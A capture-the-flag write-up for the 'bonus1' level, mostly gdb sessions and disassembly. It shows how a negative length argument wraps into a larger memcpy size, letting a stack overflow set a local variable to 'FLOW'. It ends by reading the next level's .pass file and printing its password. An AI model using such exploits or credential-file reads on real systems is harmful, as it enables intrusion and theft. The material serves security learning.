# bonus1

## disassemble

```shell
objdump -dC -M intel bonus1
```

## Exploit

```shell
# 8048468:       89 4c 24 08             mov    DWORD PTR [esp+0x8],ecx
# 804846c:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
# 8048470:       89 04 24                mov    DWORD PTR [esp],eax
# 8048473:       e8 a8 fe ff ff          call   8048320 <memcpy@plt>

gdb bonus1
(gdb) break *0x8048473

# INT_MIN / 2
# -2147483648 / 2 = -1073741824
(gdb) run -1073741824 BBBB

(gdb) info registers 
eax            0xbffff6f4       -1073744140
ecx            0x0      0
# ecx = 0 --> number of bit copies by memcpy
```

```shell
# 8048473:       e8 a8 fe ff ff          call   8048320 <memcpy@plt>
# 8048478:       81 7c 24 3c 46 4c 4f    cmp    DWORD PTR [esp+0x3c],0x574f4c46
break *0x8048478

# ecx = 4
run -1073741823 BBBB
(gdb) print $esp
$1 = (void *) 0xbffff6e0
(gdb) x/x 0xbffff6e0
0xbffff6e0:     0xbffff6f4
(gdb) x/12x 0xbffff6f4
0xbffff6f4:     0x42424242      0x08049764      0x080484d1      0xffffffff
0xbffff704:     0xb7e5edc6      0xb7fd0ff4      0xb7e5ee55      0xb7fed280
0xbffff714:     0x00000000      0x080484b9      0xc0000001  --> 0x080484b0 <--
```

```shell
# 11 x 4 = 44
# -1073741824 + 11 = -1073741813
# 1464814662 --> 0x574f4c46 --> \x46\x4c\x4f\x57

python2.7 -c 'print(("BBBB" * 10) + "\x46\x4c\x4f\x57")'
./bonus1 -1073741813 $(python2.7 -c 'print(("BBBB" * 10) + "\x46\x4c\x4f\x57")')
./bonus1 -1073741813 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBFLOW
```

# flag

```shell
cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
